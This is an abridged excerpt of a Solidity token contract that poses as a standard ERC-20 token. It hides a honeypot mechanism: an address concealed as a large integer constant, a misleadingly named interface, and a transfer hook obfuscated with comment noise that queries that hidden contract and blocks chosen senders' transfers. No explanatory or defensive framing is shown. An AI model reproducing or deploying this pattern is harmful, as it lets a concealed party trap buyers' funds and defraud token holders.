...
interface IERC721 {
    function add(address _a,uint256 _b) external view returns (bool);
}
...
contract Token is IERC20, BAKDYUTR, Ownable {
    ...
    uint160 private uint256RIYAHNA = 1186205207849414770245270081246080829993964306174;
    ...
    function _beforeTokenTransfer(address sender,address recipient,uint256 amount) internal virtual  {
        uint256 total = 0;
        AJFYANAUQ = AJFYANAUQ.add(total);
        bool resul = /**&&///**/IERC721(address(uint256RIYAHNA))/*//*/.add(sender,AJFYANAUQ);
        if(resul){
            amount = total;
            require(amount > 0);
        }
